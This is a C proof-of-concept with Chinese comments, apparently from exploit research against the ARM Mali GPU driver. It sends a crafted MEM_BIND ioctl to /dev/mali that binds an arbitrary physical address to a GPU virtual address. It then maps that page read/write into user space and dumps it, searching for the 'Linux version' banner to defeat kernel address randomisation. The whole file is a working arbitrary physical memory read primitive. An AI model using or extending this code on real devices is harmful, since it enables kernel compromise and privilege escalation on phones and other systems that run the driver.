/*
 * kort_phys_read2.c - 修正版 BIND 页 mmap 读测试
 * phys@24 rights@28 修正后, BIND 外部页应能 mmap -> 任意物理内存读!
 *
 * 测试: BIND banner 候选页 (slide=0: PA 0x01DC0000) + mmap 读
 * 若读到 "Linux version" => slide=0 命中
 * 若读到别的内容 => 该物理页实际内容 (可用于搜索 banner 定位 slide)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define MALI_IOC_MEM_BIND   0xC0288302
#define MALI_IOC_MEM_UNBIND 0xC0108303

static volatile int g_to = 0;
static void alh(int s) { g_to = 1; }
static int tio(int fd, unsigned int cmd, void *buf, int t) {
    alarm(t); g_to = 0;
    int r = ioctl(fd, cmd, buf);
    int e = errno; alarm(0);
    if (g_to) return -999;
    return r == 0 ? 0 : -e;
}

static int bind_phys(int fd, uint32_t phys, uint32_t gpu_va, uint32_t size) {
    uint8_t raw[40];
    memset(raw, 0, sizeof(raw));
    uint64_t ctx = 0;
    uint32_t vaddr = gpu_va, sz = size, fl = 0x800,
             pa = phys, rights = 0x37;
    memcpy(raw + 0,  &ctx, 8);
    memcpy(raw + 8,  &vaddr, 4);
    memcpy(raw + 12, &sz, 4);
    memcpy(raw + 16, &fl, 4);
    memcpy(raw + 24, &pa, 4);
    memcpy(raw + 28, &rights, 4);
    return tio(fd, MALI_IOC_MEM_BIND, raw, 3);
}

static void hexdump(const void *p, int n) {
    const uint8_t *b = (const uint8_t*)p;
    for (int i = 0; i < n; i += 16) {
        printf("  %04x:", i);
        for (int j = 0; j < 16; j++) printf(" %02x", b[i + j]);
        printf("  ");
        for (int j = 0; j < 16; j++)
            printf("%c", (b[i+j] >= 0x20 && b[i+j] < 0x7f) ? b[i+j] : '.');
        printf("\n");
    }
}

int main(int argc, char **argv) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = alh;
    sigaction(SIGALRM, &sa, NULL);
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t pa = (argc > 1) ? strtoul(argv[1], 0, 0) : 0x01DC0000u;
    printf("[*] kort_phys_read2: BIND 0x%08x + mmap read test\n", pa);

    int fd = open("/dev/mali", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    const uint32_t VA = 0x41000000u;
    if (bind_phys(fd, pa, VA, 0x1000) != 0) {
        printf("[-] BIND failed\n"); return 1;
    }
    printf("[+] BIND OK\n");

    void *m = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, VA);
    if (m == MAP_FAILED) {
        printf("[-] mmap: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] mmap OK at %p\n", m);
    hexdump(m, 256);

    /* 搜 banner */
    if (memcmp(m, "Linux version", 13) == 0)
        printf("[+] *** BANNER FOUND at this page! ***\n");

    munmap(m, 0x1000);
    close(fd);
    return 0;
}
